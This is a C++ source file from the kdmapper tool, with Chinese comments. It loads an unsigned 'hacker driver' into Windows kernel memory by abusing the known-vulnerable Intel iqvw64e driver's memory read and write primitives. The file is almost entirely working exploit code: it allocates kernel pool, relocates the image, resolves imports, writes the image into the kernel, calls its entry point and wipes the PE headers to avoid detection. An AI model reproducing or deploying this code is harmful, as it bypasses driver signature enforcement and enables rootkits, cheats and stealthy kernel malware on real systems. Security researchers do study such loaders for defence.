#include "kdmapper.hpp"

uint64_t kdmapper::MapDriver(HANDLE iqvw64e_device_handle, const std::string& driver_path)
{
	//读取黑客驱动数据
	std::vector<uint8_t> raw_image = { 0 };
	if (!utils::ReadFileToMemory(driver_path, &raw_image))
	{
		std::cout << "[-] 无法读取黑客驱动数据到内存中" << std::endl;
		return 0;
	}

	//尝试取得NT文件头
	const PIMAGE_NT_HEADERS64 nt_headers = portable_executable::GetNtHeaders(raw_image.data());
	if (!nt_headers)
	{
		std::cout << "[-] 不是有效的x64位驱动程序" << std::endl;
		return 0;
	}

	//获取黑客驱动的映像大小
	const uint32_t image_size = nt_headers->OptionalHeader.SizeOfImage;
	void* local_image_base = VirtualAlloc(nullptr, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	//在漏洞驱动里面申请相应大小的内存空间
	uint64_t kernel_image_base = intel_driver::AllocatePool(iqvw64e_device_handle, nt::NonPagedPool, image_size);

	do
	{
		if (!kernel_image_base)
		{
			std::cout << "[-] 无法在漏洞驱动程序申请内存空间" << std::endl;
			break;
		}

		std::cout << "[+] 申请漏洞驱动空间地址在 0x" << reinterpret_cast<void*>(kernel_image_base) << std::endl;

		// Copy image headers 复制映像头

		memcpy(local_image_base, raw_image.data(), nt_headers->OptionalHeader.SizeOfHeaders);

		// Copy image sections 复制映像节区

		const PIMAGE_SECTION_HEADER section_headers = IMAGE_FIRST_SECTION(nt_headers);

		for (auto i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i)
		{
			if ((section_headers[i].Characteristics & (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE)) != 0 &&
				section_headers[i].PointerToRawData != 0)
			{
				const auto local_section = reinterpret_cast<void*>(reinterpret_cast<uint64_t>(local_image_base) + section_headers[i].VirtualAddress);
				memcpy(local_section, reinterpret_cast<void*>(reinterpret_cast<uint64_t>(raw_image.data()) + section_headers[i].PointerToRawData), section_headers[i].SizeOfRawData);
			}
		}

		// Initialize stack cookie if driver was compiled with /GS
		// 如果程序编译带了/GS，还要初始化堆栈cookie

		InitStackCookie(local_image_base);

		// Resolve relocs and imports
		// 解决重定位和输入表

		// A missing relocation directory is OK, but disallow IMAGE_FILE_RELOCS_STRIPPED
		// Not checked: IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE in DllCharacteristics. The DDK/WDK has never set this mostly for historical reasons
		const portable_executable::vec_relocs& relocs = portable_executable::GetRelocs(local_image_base);
		if (relocs.empty() && (nt_headers->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) != 0)
		{
			std::cout << "[-] 映像无法重定位" << std::endl;
			break;
		}

		RelocateImageByDelta(relocs, kernel_image_base - nt_headers->OptionalHeader.ImageBase);

		if (!ResolveImports(iqvw64e_device_handle, portable_executable::GetImports(local_image_base)))
		{
			std::cout << "[-] 无法修复导入表" << std::endl;
			break;
		}

		// Write fixed image to kernel
		// 写入到内核空间

		if (!intel_driver::WriteMemory(iqvw64e_device_handle, kernel_image_base, local_image_base, image_size))
		{
			std::cout << "[-] 无法将黑客驱动写入到漏洞内核内存空间" << std::endl;
			break;
		}

		VirtualFree(local_image_base, 0, MEM_RELEASE);

		// Call driver entry point
		// 调用黑客驱动函数

		const uint64_t address_of_entry_point = kernel_image_base + nt_headers->OptionalHeader.AddressOfEntryPoint;

		std::cout << "[<] 调用入口在 0x" << reinterpret_cast<void*>(address_of_entry_point) << std::endl;

		NTSTATUS status = 0;

		if (!intel_driver::CallKernelFunction(iqvw64e_device_handle, &status, address_of_entry_point))
		{
			std::cout << "[-] 无法调用入口函数" << std::endl;
			break;
		}

		std::cout << "[+] DriverEntry函数返回 0x" << std::hex << std::setw(8) << std::setfill('0') << std::uppercase << status << std::nouppercase << std::dec << std::endl;

		// Erase PE headers
		// 移除PE头

		intel_driver::SetMemory(iqvw64e_device_handle, kernel_image_base, 0, nt_headers->OptionalHeader.SizeOfHeaders);
		return kernel_image_base;
	} while (false);

	//释放内存
	VirtualFree(local_image_base, 0, MEM_RELEASE);
	intel_driver::FreePool(iqvw64e_device_handle, kernel_image_base);

	return 0;
}

void kdmapper::RelocateImageByDelta(const portable_executable::vec_relocs& relocs, const uint64_t delta)
{
	for (const auto& current_reloc : relocs)
	{
		for (auto i = 0u; i < current_reloc.count; ++i)
		{
			const uint16_t type = current_reloc.item[i] >> 12;
			const uint16_t offset = current_reloc.item[i] & 0xFFF;

			if (type == IMAGE_REL_BASED_DIR64)
				* reinterpret_cast<uint64_t*>(current_reloc.address + offset) += delta;
		}
	}
}

bool kdmapper::ResolveImports(HANDLE iqvw64e_device_handle, const portable_executable::vec_imports& imports)
{
	for (const auto& current_import : imports)
	{
		if (!utils::GetKernelModuleAddress(current_import.module_name))
		{
			std::cout << "[-] Dependency " << current_import.module_name << " wasn't found" << std::endl;
			return false;
		}

		for (auto& current_function_data : current_import.function_datas)
		{
			const uint64_t function_address = intel_driver::GetKernelModuleExport(iqvw64e_device_handle, utils::GetKernelModuleAddress(current_import.module_name), current_function_data.name);

			if (!function_address)
			{
				std::cout << "[-] Failed to resolve import " << current_function_data.name << " (" << current_import.module_name << ")" << std::endl;
				return false;
			}

			*current_function_data.address = function_address;
		}
	}

	return true;
}

void kdmapper::InitStackCookie(void* base)
{
	const PIMAGE_NT_HEADERS64 nt_headers = RtlImageNtHeader(base);
	ULONG config_dir_size = 0;
	const PIMAGE_LOAD_CONFIG_DIRECTORY64 config_dir = static_cast<PIMAGE_LOAD_CONFIG_DIRECTORY64>(
		RtlImageDirectoryEntryToData(base,
			TRUE,
			IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG,
			&config_dir_size));
	if (config_dir == nullptr || config_dir_size == 0)
		return;

	uint64_t cookie_va;
	if ((cookie_va = static_cast<uint64_t>(config_dir->SecurityCookie)) == 0)
		return;
	cookie_va = cookie_va - nt_headers->OptionalHeader.ImageBase + reinterpret_cast<uint64_t>(base);

	uint64_t cookie = SharedUserData->SystemTime.LowPart ^ cookie_va;
	cookie &= 0x0000FFFFFFFFFFFFi64;

	constexpr uint64_t default_security_cookie64 = 0x00002B992DDFA232ULL;
	if (static_cast<uint64_t>(cookie) == default_security_cookie64)
		cookie++;

	// Guess the address of the complement (normally correct for MSVC-compiled binaries)
	uint64_t cookie_complement_va = cookie_va + sizeof(uint64_t);
	if (*reinterpret_cast<uint64_t*>(cookie_complement_va) != ~default_security_cookie64)
	{
		// Nope; try before the cookie instead
		cookie_complement_va = cookie_va - sizeof(uint64_t);
		if (*reinterpret_cast<uint64_t*>(cookie_complement_va) != ~default_security_cookie64)
			cookie_complement_va = 0;
	}

	*reinterpret_cast<uint64_t*>(cookie_va) = cookie;
	if (cookie_complement_va != 0)
		*reinterpret_cast<uint64_t*>(cookie_complement_va) = ~cookie;
}